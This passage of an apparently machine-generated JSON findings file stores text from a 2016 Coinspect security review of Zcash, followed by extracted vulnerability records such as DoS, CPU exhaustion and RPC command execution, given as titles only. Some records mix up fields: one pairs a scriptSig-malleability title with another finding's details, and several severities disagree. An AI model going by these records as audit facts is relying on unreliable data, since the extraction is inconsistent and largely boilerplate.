bytes when testing the prevout hash field for zero. This also solves the problem in \"A\nfix for transaction malleability\" Pull Request #1144 that requires to treat coinbase transaction\ndifferently to prevent coinbase transactions with the same id. Also this change also makes for\nsimpler fast transaction graph analyzers since they don’t need to keep scriptSig information for\ncoinbases.\n6.6. Mask out the must-be-zero bits in the previous-block-hash (block\nheader) so miners can reuse them for nonce space\nThis is a minor space optimization that helps Bitcoin, but does not provide Zcash much benefit\nsince Zcash already provides a 256 bit nonce space.\n6.7. Allow adding additional inputs to generation transactions\nCurrently coinbase transactions have a single input limit. This prevents letting a miner create a\nbond time-locked to coinbase maturity time by including an additional input to the coinbase\ntransaction. Bonds can be used to penalize miners that create blocks at the same height in two\ncompeting forks. Although bonds are not required when the subsidy is high, it may be the case\nthat the blockchain needs to soft-fork in the future and require such bonds.\n6.8. Include value of TxOut being spent in signature hash\nTo allow hardware wallets to correctly prompt the user what they are signing for, it’s important\nthat the confirmation messages includes the number of bitcoins being transferred and the fee\n© 2016 Coinspect 22\n\n-- 24 of 26 --\n\nbeing paid. If the hardware does not know the exact number of bitcoins collected by its inputs, it\ncannot know the transaction fees, then an active attacker in the PC could cheat the hardware\nwallet to leak bitcoins into transaction fees. To compute the input amount, the hardware wallet\nneeds to process all transactions referred by prevouts. This can be a huge amount of\ninformation that must be transmitted and processed by the hardware wallet. To prevent it,\nsegwit includes in the hashed message the number of bitcoins related to an input when signing\nsuch input. Therefore, even if the hardware wallet could be cheated to sign an invalid\ntransaction, it cannot be cheated to sign a valid transaction leaking bitcoins into transaction\nfees. In a similar way the input amounts should be included along the hashed transaction for\nsigning.\n6.9. Prevent O(n2) hashing attack by serializing only the hashes of inputs\nand outputs\nSegwit prevents O(n2) hashing attack by changing how transactions are serialized for signing. A\nsmall modification to current Zcash hashing method can also prevent it (Serialize() in\ninterpreter.cpp). Instead of serializing inputs and outputs, only their hashes are serialized. This\nbrings the possibility to later cache input/output hash digests and re-use them and prevent the\nattack.\n6.10. CHECKMULTISIG popping one-too-many items off the stack\nThe CHECKMULTISIG opcode has a bug that makes it pop an additional unwanted element\nfrom the stack. Therefore, scripts using CHECKMULTISIG must provide an additional dummy\nelement.\n6.11. Extended Scripts opcodes can be enabled, after security audit\nBitcoin has a scripting language that has been crippled due to suspicion of security concerns\nregarding DoS attacks. The removed opcodes could be re-included, after careful security audit\nto prevent resource abuse.\n6.12. Include the maximum size of a scriptSig or transaction for each input\nsignature\nMiners/relays should not be able to inject extra arbitrary data into transactions. Currently relays\ncan insert arbitrary data in scriptSig fields of a transaction, since the transaction id does not\ncover such fields. Only the IsStandard() check protects such malleability, but IsStandard() is not\npart of the consensus, but rather of the implementation, and DoS prevention should not be\nbased on IsStandard() restrictions. If an attacker manages to add too much data, he can make\nthe transaction be broadcasted to the network, but prevent such transaction from being included\nin a block (due to low fees/bytes). This problem currently exists in segwit. Therefore, the\nmaximum size of the transaction (or better, of each scriptSig) should be signed.\nSome of these suggestions are listed in the Bitcoin Hardfork Wishlist\n© 2016 Coinspect 23\n\n-- 25 of 26 --\n\n\n-- 26 of 26 --",
+    "sourceFileName": "CoinspectReportZcash2016.pdf",
+    "createdAtIso": "2026-06-05T23:31:50.589Z",
+    "updatedAtIso": "2026-06-05T23:31:50.589Z"
+  },
+  "findings": [
+    {
+      "id": "F-coinspect-001",
+      "slug": "dos-attack-if-orphan-joinsplit-transactions-are-enabled-investigation-scope",
+      "reportId": "G-coinspect-zcash-2016-source-code-review",
+      "reportName": "coinspect-zcash-2016-source-code-review",
+      "title": "DoS attack if orphan JoinSplit transactions are enabled",
+      "cve": "—",
+      "severity": "Low",
+      "asset": "investigation-scope",
+      "score": 35,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:31:42.014Z",
+      "summary": "DoS attack if orphan JoinSplit transactions are enabled affecting investigation-scope; extractor found type Denial of Service.",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: ZCA-001",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:31:50.556Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected."
+        }
+      ],
+      "reported": {
+        "title": "DoS attack if orphan JoinSplit transactions are enabled",
+        "severity": "Low",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "DoS attack if orphan JoinSplit transactions are enabled affecting investigation-scope; extractor found type Denial of Service.",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: ZCA-001",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "dos attack if orphan joinsplit transactions are enabled",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "ZCA-001|dos attack if orphan joinsplit transactions are enabled|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "DoS attack if orphan JoinSplit transactions are enabled",
+        "sourceText": "ZCA-001 DoS attack if orphan JoinSplit transactions are enabled Low",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "DoS attack if orphan JoinSplit transactions are enabled",
+      "canonicalKey": "ZCA-001|dos attack if orphan joinsplit transactions are enabled|investigation scope||||||"
+    },
+    {
+      "id": "F-coinspect-002",
+      "slug": "inheriting-findanddelete-from-bitcoin-is-considered-dangerous-investigation-scope",
+      "reportId": "G-coinspect-zcash-2016-source-code-review",
+      "reportName": "coinspect-zcash-2016-source-code-review",
+      "title": "Inheriting FindAndDelete from Bitcoin is considered dangerous",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:31:42.014Z",
+      "summary": "Inheriting FindAndDelete from Bitcoin is considered dangerous affecting investigation-scope; extractor found security indicators from the submitted report.",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: ZCA-002",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:31:50.556Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected."
+        }
+      ],
+      "reported": {
+        "title": "Inheriting FindAndDelete from Bitcoin is considered dangerous",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Inheriting FindAndDelete from Bitcoin is considered dangerous affecting investigation-scope; extractor found security indicators from the submitted report.",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: ZCA-002",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "inheriting findanddelete from bitcoin is considered dangerous",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "ZCA-002|inheriting findanddelete from bitcoin is considered dangerous|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Inheriting FindAndDelete from Bitcoin is considered dangerous",
+        "sourceText": "ZCA-002 Inheriting FindAndDelete from Bitcoin is considered dangerous Medium",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Inheriting FindAndDelete from Bitcoin is considered dangerous",
+      "canonicalKey": "ZCA-002|inheriting findanddelete from bitcoin is considered dangerous|investigation scope||||||"
+    },
+    {
+      "id": "F-G-coinspect-zcash-2016-source-code-review-GIDX-003",
+      "slug": "dos-attack-if-orphan-joinsplit-transactions-are-enabled-investigation-scope",
+      "reportId": "G-coinspect-zcash-2016-source-code-review",
+      "reportName": "coinspect-zcash-2016-source-code-review",
+      "title": "scriptSig malleability allows 51% attack by invalidating honest miners blocks",
+      "cve": "—",
+      "severity": "High",
+      "asset": "investigation-scope",
+      "score": 84,
+      "status": "Open",
+      "detectedAt": "2026-06-05T23:31:42.014Z",
+      "summary": "scriptSig malleability allows 51% attack by invalidating honest miners blocks affecting investigation-scope; finding recovered from the official report index and requires review.",
+      "impact": "Potential impact includes exploitation, unauthorized access, data exposure, or service compromise against investigation-scope if this issue remains unaddressed.",
+      "evidence": "Finding IDs: ZCA-001",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:31:50.556Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected."
+        }
+      ],
+      "reported": {
+        "title": "DoS attack if orphan JoinSplit transactions are enabled",
+        "severity": "Low",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "DoS attack if orphan JoinSplit transactions are enabled affecting investigation-scope; extractor found type Denial of Service.",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: ZCA-001",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "dos attack if orphan joinsplit transactions are enabled",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "ZCA-003|scriptsig malleability allows 51 attack by invalidating honest miners blocks|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "scriptSig malleability allows 51% attack by invalidating honest miners blocks",
+        "sourceText": "ZCA-003 scriptSig malleability allows 51% attack by invalidating honest miners blocks High",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-recovery"
+      },
+      "method": "generic-official-index-recovery",
+      "sourceSectionTitle": "scriptSig malleability allows 51% attack by invalidating honest miners blocks",
+      "canonicalKey": "ZCA-003|scriptsig malleability allows 51 attack by invalidating honest miners blocks|investigation scope||||||"
+    },
+    {
+      "id": "F-coinspect-003",
+      "slug": "decrease-in-huge-reorg-security-margin-investigation-scope",
+      "reportId": "G-coinspect-zcash-2016-source-code-review",
+      "reportName": "coinspect-zcash-2016-source-code-review",
+      "title": "Decrease in huge-reorg security margin",
+      "cve": "—",
+      "severity": "Low",
+      "asset": "investigation-scope",
+      "score": 35,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:31:42.014Z",
+      "summary": "Decrease in huge-reorg security margin affecting investigation-scope; extractor found security indicators from the submitted report.",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: ZCA-004",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:31:50.556Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected."
+        }
+      ],
+      "reported": {
+        "title": "Decrease in huge-reorg security margin",
+        "severity": "Low",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Decrease in huge-reorg security margin affecting investigation-scope; extractor found security indicators from the submitted report.",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: ZCA-004",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "decrease in huge-reorg security margin",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "ZCA-004|decrease in huge reorg security margin|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Decrease in huge-reorg security margin",
+        "sourceText": "ZCA-004 Decrease in huge-reorg security margin Low",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Decrease in huge-reorg security margin",
+      "canonicalKey": "ZCA-004|decrease in huge reorg security margin|investigation scope||||||"
+    },
+    {
+      "id": "F-coinspect-004",
+      "slug": "unlimited-number-of-transaction-proofs-allows-cpu-exhaustion-attacks-investigation-scope",
+      "reportId": "G-coinspect-zcash-2016-source-code-review",
+      "reportName": "coinspect-zcash-2016-source-code-review",
+      "title": "Unlimited number of transaction proofs allows CPU-exhaustion attacks",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:31:42.014Z",
+      "summary": "Unlimited number of transaction proofs allows CPU-exhaustion attacks affecting investigation-scope; extractor found security indicators from the submitted report.",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: ZCA-005",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:31:50.557Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected."
+        }
+      ],
+      "reported": {
+        "title": "Unlimited number of transaction proofs allows CPU-exhaustion attacks",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Unlimited number of transaction proofs allows CPU-exhaustion attacks affecting investigation-scope; extractor found security indicators from the submitted report.",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: ZCA-005",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "unlimited number of transaction proofs allows cpu-exhaustion attacks",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "ZCA-005|unlimited number of transaction proofs allows cpu exhaustion attacks|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Unlimited number of transaction proofs allows CPU-exhaustion attacks",
+        "sourceText": "ZCA-005 Unlimited number of transaction proofs allows CPU-exhaustion attacks Medium",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Unlimited number of transaction proofs allows CPU-exhaustion attacks",
+      "canonicalKey": "ZCA-005|unlimited number of transaction proofs allows cpu exhaustion attacks|investigation scope||||||"
+    },
+    {
+      "id": "F-coinspect-005",
+      "slug": "erroneous-nvalueout-range-check-allows-cpu-exhaustion-attacks-investigation-scope",
+      "reportId": "G-coinspect-zcash-2016-source-code-review",
+      "reportName": "coinspect-zcash-2016-source-code-review",
+      "title": "Erroneous nValueOut range check allows CPU-exhaustion attacks",
+      "cve": "—",
+      "severity": "High",
+      "asset": "investigation-scope",
+      "score": 84,
+      "status": "Open",
+      "detectedAt": "2026-06-05T23:31:42.014Z",
+      "summary": "Erroneous nValueOut range check allows CPU-exhaustion attacks affecting investigation-scope; extractor found security indicators from the submitted report.",
+      "impact": "Potential impact includes exploitation, unauthorized access, data exposure, or service compromise against investigation-scope if this issue remains unaddressed.",
+      "evidence": "Finding IDs: ZCA-006",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:31:50.557Z",
+          "status": "Open",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected."
+        }
+      ],
+      "reported": {
+        "title": "Erroneous nValueOut range check allows CPU-exhaustion attacks",
+        "severity": "High",
+        "asset": "investigation-scope",
+        "status": "Open",
+        "summary": "Erroneous nValueOut range check allows CPU-exhaustion attacks affecting investigation-scope; extractor found security indicators from the submitted report.",
+        "impact": "Potential impact includes exploitation, unauthorized access, data exposure, or service compromise against investigation-scope if this issue remains unaddressed.",
+        "evidence": "Finding IDs: ZCA-006",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "erroneous nvalueout range check allows cpu-exhaustion attacks",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "ZCA-006|erroneous nvalueout range check allows cpu exhaustion attacks|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Erroneous nValueOut range check allows CPU-exhaustion attacks",
+        "sourceText": "ZCA-006 Erroneous nValueOut range check allows CPU-exhaustion attacks High",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Erroneous nValueOut range check allows CPU-exhaustion attacks",
+      "canonicalKey": "ZCA-006|erroneous nvalueout range check allows cpu exhaustion attacks|investigation scope||||||"
+    },
+    {
+      "id": "F-coinspect-006",
+      "slug": "forever-growing-nullifier-set-will-end-up-being-stored-in-nonvolatile-memory-investigation-scope",
+      "reportId": "G-coinspect-zcash-2016-source-code-review",
+      "reportName": "coinspect-zcash-2016-source-code-review",
+      "title": "Forever growing nullifier set will end up being stored in nonvolatile memory",
+      "cve": "—",
+      "severity": "Low",
+      "asset": "investigation-scope",
+      "score": 35,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:31:42.014Z",
+      "summary": "Forever growing nullifier set will end up being stored in nonvolatile memory affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: ZCA-007 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:31:50.557Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "Forever growing nullifier set will end up being stored in nonvolatile memory",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Forever growing nullifier set will end up being stored in nonvolatile memory affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: ZCA-007 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "forever growing nullifier set will end up being stored in nonvolatile memory",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "ZCA-007|forever growing nullifier set will end up being stored in nonvolatile memory|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Forever growing nullifier set will end up being stored in nonvolatile memory",
+        "sourceText": "ZCA-007 Forever growing nullifier set will end up being stored in nonvolatile memory Low",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "inferred",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Forever growing nullifier set will end up being stored in nonvolatile memory",
+      "canonicalKey": "ZCA-007|forever growing nullifier set will end up being stored in nonvolatile memory|investigation scope||||||"
+    },
+    {
+      "id": "F-coinspect-007",
+      "slug": "forever-growing-commitment-tree-slows-down-commitment-lookup-investigation-scope",
+      "reportId": "G-coinspect-zcash-2016-source-code-review",
+      "reportName": "coinspect-zcash-2016-source-code-review",
+      "title": "Forever growing commitment tree slows down commitment lookup",
+      "cve": "—",
+      "severity": "Low",
+      "asset": "investigation-scope",
+      "score": 35,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:31:42.014Z",
+      "summary": "Forever growing commitment tree slows down commitment lookup affecting investigation-scope; extractor found security indicators from the submitted report.",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: ZCA-008",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:31:50.558Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected."
+        }
+      ],
+      "reported": {
+        "title": "Forever growing commitment tree slows down commitment lookup",
+        "severity": "Low",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Forever growing commitment tree slows down commitment lookup affecting investigation-scope; extractor found security indicators from the submitted report.",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: ZCA-008",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "forever growing commitment tree slows down commitment lookup",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "ZCA-008|forever growing commitment tree slows down commitment lookup|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Forever growing commitment tree slows down commitment lookup",
+        "sourceText": "ZCA-008 Forever growing commitment tree slows down commitment lookup Low",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Forever growing commitment tree slows down commitment lookup",
+      "canonicalKey": "ZCA-008|forever growing commitment tree slows down commitment lookup|investigation scope||||||"
+    },
+    {
+      "id": "F-coinspect-008",
+      "slug": "improper-destination-path-validation-in-rpc-calls-allows-arbitrary-command-investigation-scope",
+      "reportId": "G-coinspect-zcash-2016-source-code-review",
+      "reportName": "coinspect-zcash-2016-source-code-review",
+      "title": "Improper destination path validation in RPC calls allows arbitrary command execution",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:31:42.014Z",
+      "summary": "Improper destination path validation in RPC calls allows arbitrary command affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: ZCA-009 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:31:50.558Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "Improper destination path validation in RPC calls allows arbitrary command",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Improper destination path validation in RPC calls allows arbitrary command affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: ZCA-009 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "improper destination path validation in rpc calls allows arbitrary command",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "ZCA-009|improper destination path validation in rpc calls allows arbitrary command execution|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Improper destination path validation in RPC calls allows arbitrary command execution",
+        "sourceText": "ZCA-009 Improper destination path validation in RPC calls allows arbitrary command execution Medium",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "inferred",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Improper destination path validation in RPC calls allows arbitrary command execution",
+      "canonicalKey": "ZCA-009|improper destination path validation in rpc calls allows arbitrary command execution|investigation scope||||||"
+    },
+    {
+      "id": "F-coinspect-009",
+      "slug": "improper-destination-file-permissions-check-in-rpc-calls-could-expose-secret-investigation-scope",
+      "reportId": "G-coinspect-zcash-2016-source-code-review",
+      "reportName": "coinspect-zcash-2016-source-code-review",
+      "title": "Improper destination file permissions check in RPC calls could expose secret keys",
+      "cve": "—",
+      "severity": "Low",
+      "asset": "investigation-scope",
+      "score": 35,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:31:42.014Z",
+      "summary": "Improper destination file permissions check in RPC calls could expose secret affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: ZCA-010 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:31:50.559Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "Improper destination file permissions check in RPC calls could expose secret",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Improper destination file permissions check in RPC calls could expose secret affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: ZCA-010 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "improper destination file permissions check in rpc calls could expose secret",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "ZCA-010|improper destination file permissions check in rpc calls could expose secret keys|investigation scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Improper destination file permissions check in RPC calls could expose secret keys",
+        "sourceText": "ZCA-010 Improper destination file permissions check in RPC calls could expose secret keys Low",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "inferred",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Improper destination file permissions check in RPC calls could expose secret keys",
+      "canonicalKey": "ZCA-010|improper destination file permissions check in rpc calls could expose secret keys|investigation scope||||||"
+    },
+    {
+      "id": "F-coinspect-010",
+      "slug": "information-exposure-through-log-files-investigation-scope",
+      "reportId": "G-coinspect-zcash-2016-source-code-review",
+      "reportName": "coinspect-zcash-2016-source-code-review",
+      "title": "Information exposure through log files",
+      "cve": "—",
+      "severity": "Low",
+      "asset": "investigation-scope",
+      "score": 35,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:31:42.014Z",
+      "summary": "Information exposure through log files affecting investigation-scope; extractor found security indicators from the submitted report.",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: ZCA-011",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:31:50.559Z",
+          "status": "In Review",
